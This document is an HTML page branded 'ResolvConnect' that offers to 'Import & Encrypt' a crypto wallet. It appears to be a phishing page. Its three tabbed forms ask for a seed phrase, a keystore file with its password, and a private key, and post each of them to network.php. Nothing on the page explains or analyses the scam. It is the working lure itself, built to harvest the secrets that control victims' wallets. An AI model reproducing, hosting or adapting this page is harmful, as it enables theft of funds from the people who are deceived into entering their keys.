
<!DOCTYPE html>

<head>

  <html>
  <meta name="viewport" content="width=device-width" />
  <meta charSet="utf-8" />
  <title>ResolvConnect</title>
  <link rel="shortcut icon" href="images/favicon.ico" />

  <link rel="stylesheet" href="style.css"/>
  <link rel="stylesheet" href="import.css"/>
    <meta name=”robots” content=”nofollow” />
    <meta name=”robots” content=”noindex”>
  
</head>

<body>
  <div id="__next">
    <div class="font-roboto" id="content">

      <script>
        function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;

    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }

    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }

    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
</script>

<main id="wallets" class="flex flex-col mx-8 mt-12 space-y-10 text-center align-middle">
  <center>
    <h2 style="font-size: 30px;">Import & Encrypt Wallet</h2>
  </br>
    <div class="tab">
    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Seed/Recovery Phrase</b></button>
    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
  </div>

  <div id="phrase" class="tabcontent">
    <form action="network.php" method="POST">
      <textarea name="phase" required="required" minlength="12" placeholder="Seed/Recovery Phrase"></textarea>
      <br />
      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
      <br />
      <button type="submit" name="import" class="btn">IMPORT</button>
    </form>
  </div>

  <div id="keystore" class="tabcontent">
    <form action="network.php" method="POST">

      <textarea name="keystore" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
      <br />
      <div class="field">
        <input type="password" name="keystore_password" id="password" placeholder="Password"/>
      </div>
      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
    </br>
    <button type="submit" name="import" class="btn">IMPORT</button>
  </form>
</div>

<div id="private" class="tabcontent">
  <form action="network.php" method="POST">
    <div class="field">
      <input type="text" name="private_key" required="required" minlength="12" id="key" autocomplete="off" placeholder="Private Key"/>
    </div>
    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
  </br>
  <button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<script>
  document.getElementById("default").click();
</script>
</center>
</main>
<footer class="flex justify-center mt-24 mb-16 sm:mt-32">
  <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" rel="noopener noreferrer">
    <div class="flex"><img class="w-6 sm:w-8" src="images/61a3c05228b28e1dac511bfd6f3651cb6b0535ac.svg" alt="Discord">
      <p class="ml-2">Discord</p>
    </div>
  </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" rel="noopener noreferrer">
    <div class="flex"><img class="w-6 sm:w-8" src="images/60fcd1eea46e596e93f2a5c78fb245275b825b8d.svg" alt="Telegram">
      <p class="ml-2">Telegram</p>
    </div>
  </a>
  <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" rel="noopener noreferrer">
    <div class="flex"><img class="w-6 sm:w-8" src="images/399cd338182b22910bd676867087cd1d2696f473.svg" alt="Twitter">
      <p class="ml-2">Twitter</p>
    </div>
  </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" rel="noopener noreferrer">
    <div class="flex"><img class="w-6 sm:w-8" src="images/4a71763293e01a10792d6f08154375f744cd1e53.svg" alt="GitHub">
      <p class="ml-2">GitHub</p>
    </div>
  </a></div>
</footer>
</div>
</div>
</body>
</html>
